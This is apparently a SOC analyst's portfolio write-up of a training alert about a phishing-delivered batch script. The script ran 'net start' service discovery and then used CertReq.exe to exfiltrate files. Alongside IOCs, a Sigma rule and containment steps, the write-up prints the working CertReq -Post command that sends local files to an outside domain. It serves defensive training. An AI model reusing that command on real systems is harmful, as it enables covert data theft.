
# SOC278 - System Service Discovery & CertReq Exfiltration


## 🚨 Raw Alert Details
```text
EventID : 254
Event Time : 2024-05-06T06:16:00+03:00
Rule : SOC278 - System Service Discovery Detected
Role : Incident Responder
Alert Type : C2 / Discovery
Difficulty : Medium
MITRE ATT&CK : T1566.001, T1059.003, T1204.002, T1007, T1105, T1567
Hostname : Peggie
IP Address : 172.16.17.92
File : C:\Users\LetsDefend\Downloads\script\script.bat
Trigger Reason : System Service Discovery Detected
Alert Trigger Command : net start >> %temp%\download.txt
EDR Action : Allowed
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / Sysmon
- **Asset Affected:** Peggie (172.16.17.92 - Windows 10)
- **Threat Type:** Spearphishing / System Discovery / LOLBin Exfiltration (`CertReq`)
- **Verdict:** True Positive (Compromised)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident represents a sophisticated multi-stage compromise starting with **Spearphishing** and progressing into **System Discovery and Exfiltration via Living off the Land Binaries (LOLBins)**.

**The Mechanics:** The attacker lures the victim into executing a malicious batch script (`script.bat`) delivered via a zipped attachment. Once executed, the script performs enumeration by running `net start >> %temp%\download.txt` to capture a list of running Windows services, allowing the malware to identify installed security solutions (like EDR agents, backup tools, or database software). For data exfiltration, the attacker utilizes **`CertReq.exe`**—a native, signed Windows utility meant for requesting certificates from a Certificate Authority. By abusing the `-Post` and `-config` switches, threat actors can force `CertReq` to perform an HTTP POST request to an external server, exfiltrating staged data while completely bypassing standard egress firewall restrictions.

## Investigation Steps

### 1. Initial Access Verification (Phishing Triage)
The investigation began by reviewing the email delivery gateway to identify the intrusion vector.
- **Sender:** `help@scriptercheck.store` (Sent to `peggie@letsdefend.io`).
- **Subject:** `Efficient Script for Performance Improvement`
- **Lure:** The email claimed to provide an efficient script to optimize RAM usage and stop unnecessary applications.
- **Attachment:** `script.zip` (Password: `infected`). 
- **Browser History:** Confirmed the user downloaded the payload via an AWS S3 bucket: `https://files-ld.s3.us-east-2.amazonaws.com/script.zip`.

<img width="1585" height="545" alt="image" src="https://github.com/user-attachments/assets/9af68030-19f8-44a3-bd40-67fe57382f9a" />

<img width="1291" height="184" alt="image" src="https://github.com/user-attachments/assets/30812e8c-6f2b-4eab-8748-ea67f4945c84" />


### 2. Execution & Discovery Phase
Process telemetry and terminal history confirmed the user extracted the archive and executed the batch script.
- **Process Lineage:** `explorer.exe` spawned `cmd.exe`, executing `C:\Users\LetsDefend\Downloads\script\script.bat`.
- **Discovery Command:** The script executed `net start >> %temp%\download.txt`, capturing active Windows services and staging them into a local text file.

<img width="1375" height="436" alt="image" src="https://github.com/user-attachments/assets/eee2e454-3020-416a-a06e-57690eb831bc" />


### 3. Exfiltration via LOLBin (`CertReq.exe`)
Further analysis of the endpoint logs revealed how the staged data was transmitted off the machine.
- **Process Creation:** `CertReq.exe` was invoked via `cmd.exe`.
- **Command Line:** `CertReq -Post -config https://wecancity.org/ c:\windows\win.ini download.txt`
- **Analysis:** This is a classic `CertReq` exfiltration technique. The attacker abuses the certificate request utility to HTTP POST local files to an external C2 server (`wecancity.org`), leveraging a signed Windows binary to evade egress monitoring.
- **Threat Intelligence:** Querying `wecancity.org` on VirusTotal revealed multiple vendor flags categorizing the domain as Phishing/Malicious.

<img width="552" height="383" alt="image" src="https://github.com/user-attachments/assets/05c8b34f-3a6b-4696-8abc-ac205764be35" />


<img width="552" height="322" alt="image" src="https://github.com/user-attachments/assets/b2e01c57-f36c-4d11-a4fe-bc26f928e4fc" />

<img width="1791" height="580" alt="image" src="https://github.com/user-attachments/assets/cf55e71b-f439-4753-9d2e-e7c8ff5c0cc5" />


## Analysis & Findings
The incident is a confirmed **True Positive**. The user "Peggie" fell victim to a spearphishing email offering a fake performance optimization script. The downloaded batch script (`script.bat`) executed successfully, performing System Service Discovery (`net start`) to profile the endpoint. It then leveraged the native Windows LOLBin `CertReq.exe` to exfiltrate the staged data via an HTTP POST request to the external malicious domain `wecancity.org`. The host is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |
| **Discovery** | T1007 | System Service Discovery (`net start`) |
| **Command and Control** | T1105 | Ingress Tool Transfer |
| **Exfiltration** | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage / C2 (`CertReq`) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| URL | `https://files-ld.s3.us-east-2.amazonaws.com/script.zip` | Malicious Payload Delivery URL (AWS S3) |
| Domain | `wecancity.org` | Attacker C2 / Exfiltration Drop Domain |
| IP Address | 20.119.0.35 | Resolved C2 Server IP |
| Binary | `CertReq.exe` | Abused LOLBin for Data Exfiltration |
| Email | `help@scriptercheck.store` | Phishing Sender Address |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of `CertReq` exfiltration, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Suspicious CertReq Data Exfiltration via HTTP POST
id: d92f0597-1234-4a5e-994d-70580c5e9f07
status: experimental
description: Detects the abuse of CertReq.exe with the -Post and -config switches to exfiltrate data to external servers.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    Image: '*\CertReq.exe'
    CommandLine|contains:
      - '-Post'
      - '-config'
  condition: selection
falsepositives:
  - Legitimate certificate enrollment requests sent to an internal Active Directory Certificate Authority (CA)
level: high
tags:
  - attack.t1567.002
  - attack.t1105
```

## 🚀 Decision Tree 
1. **Analyze Initial Vector:** Did the user execute a batch script or executable from a downloaded archive?
   - If Yes -> Proceed to Process and Terminal History.
2. **Evaluate Discovery Commands:** Did the process execute enumeration commands like `net start` or `systeminfo`?
   - *Confirmed `net start >> %temp%\download.txt`.*
3. **Check Exfiltration Mechanisms:** Did the system invoke native administrative tools like `CertReq`, `CertUtil`, or `BitsAdmin` to connect to an external URL?
   - *Confirmed `CertReq -Post -config https://wecancity.org/`.*
4. **Action:** **Verdict: True Positive - Compromised.** Immediately isolate the host, purge the phishing email, and block the C2 domain.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Peggie / 172.16.17.92`) was immediately **Isolated** from the network via EDR to prevent further data staging or exfiltration.
- **Perimeter Blocking:** The C2 domain (`wecancity.org`) and associated IP were added to the perimeter blocklist.
- **Email Purge:** The phishing email from `help@scriptercheck.store` was purged globally from the Exchange server.
- **Why:** Isolating the host halts any active data exfiltration channels and prevents the attacker from utilizing the compromised workstation for lateral movement.

## Recommendations
1. **AppLocker / WDAC Enforcement:** Restrict the execution of `CertReq.exe` across standard user endpoints. Only administrative systems requiring certificate enrollment should have execution rights for this binary.
2. **Egress Filtering:** Implement strict egress proxy rules that block `CertReq` or `CertUtil` from making outbound HTTP POST requests to non-whitelisted, external IP addresses or domains.
3. **Security Awareness Training:** Conduct targeted phishing awareness training regarding fake "performance optimization" or "RAM cleaner" utility emails.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Recognizing CertReq Abuse):** Initially, seeing `CertReq.exe` might cause an analyst to think of standard Windows certificate management 
- **The Lesson (LolBin Abuse Vectors):** Attackers frequently abuse certificate-handling binaries (`CertUtil`, `CertReq`) because they are inherently trusted by security products and designed to communicate outbound over HTTP/HTTPS. Whenever you see a certificate tool interacting with an unknown external domain combined with a `-Post` switch, treat it as a definitive data exfiltration attempt.

## 🛠️ Skills & Tools Used
- EDR Process Tree & Command Line Analysis (`CertReq`)
- Sysmon Log Correlation (Event ID 22 DNS Queries)
- Threat Intelligence Correlation (VirusTotal)
- Incident Containment (Host Isolation)
